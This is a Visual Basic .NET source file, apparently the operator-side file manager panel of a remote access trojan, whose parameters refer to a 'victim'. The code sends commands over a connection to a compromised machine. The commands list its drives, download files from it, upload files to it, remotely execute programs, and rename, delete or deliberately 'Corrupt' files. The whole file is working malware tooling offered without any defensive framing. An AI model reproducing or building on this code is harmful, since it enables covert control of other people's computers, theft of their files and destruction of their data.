Imports System.Threading

Public Class FileManager
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
    Dim Db As New DialogBox
    Sub New(ByVal c As Connection)
        InitializeComponent() : Me.Tag = c
    End Sub

    Private Sub FileManager_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        DirectCast(Me.Tag, Connection).Send("GetDrives|")
    End Sub

    Private Sub FileManager_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        ListView1.Items.Clear()
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            DirectCast(Me.Tag, Connection).Send("GetDrives|")
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
            End If
            RefreshList()
        End If
    End Sub

    Public Sub RefreshList()
        DirectCast(Me.Tag, Connection).Send("FileManager|" & TextBox1.Text)
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            Exit Sub
        End If
        Dim sfd As New SaveFileDialog With {.FileName = ListView1.FocusedItem.Text}
        If sfd.ShowDialog = DialogResult.OK Then
            RaiseEvent RetrieveFile(DirectCast(Me.Tag, Connection).IPAddress, TextBox1.Text & ListView1.FocusedItem.Text, sfd.FileName, ListView1.FocusedItem.Tag.ToString)
        End If
    End Sub

    Private Sub UploadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UploadToolStripMenuItem.Click
        Dim ofd As New OpenFileDialog
        If ofd.ShowDialog = DialogResult.OK Then
            RaiseEvent SendFile(DirectCast(Me.Tag, Connection).IPAddress, TextBox1.Text, ofd.FileName)
        End If
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    DirectCast(Me.Tag, Connection).Send("Rename|Folder|" & TextBox1.Text & ListView1.FocusedItem.Text & "|" & Db.inputText)
                Case Else
                    DirectCast(Me.Tag, Connection).Send("Rename|File|" & TextBox1.Text & ListView1.FocusedItem.Text & "|" & Db.inputText)
            End Select
        End If
        RefreshList()
    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteToolStripMenuItem.Click
        If Not ListView1.FocusedItem.ImageIndex = 0 And Not ListView1.FocusedItem.ImageIndex = 1 And Not ListView1.FocusedItem.ImageIndex = 2 And Not ListView1.FocusedItem.ImageIndex = 6 Then
            DirectCast(Me.Tag, Connection).Send("Execute|" & TextBox1.Text & ListView1.FocusedItem.Text)
        End If
    End Sub

    Private Sub CorruptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CorruptToolStripMenuItem.Click
        If Not ListView1.FocusedItem.ImageIndex = 0 And Not ListView1.FocusedItem.ImageIndex = 1 And Not ListView1.FocusedItem.ImageIndex = 2 Then
            DirectCast(Me.Tag, Connection).Send("Corrupt|" & TextBox1.Text & ListView1.FocusedItem.Text)
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                DirectCast(Me.Tag, Connection).Send("Delete|Folder|" & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                DirectCast(Me.Tag, Connection).Send("Delete|File|" & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub
End Class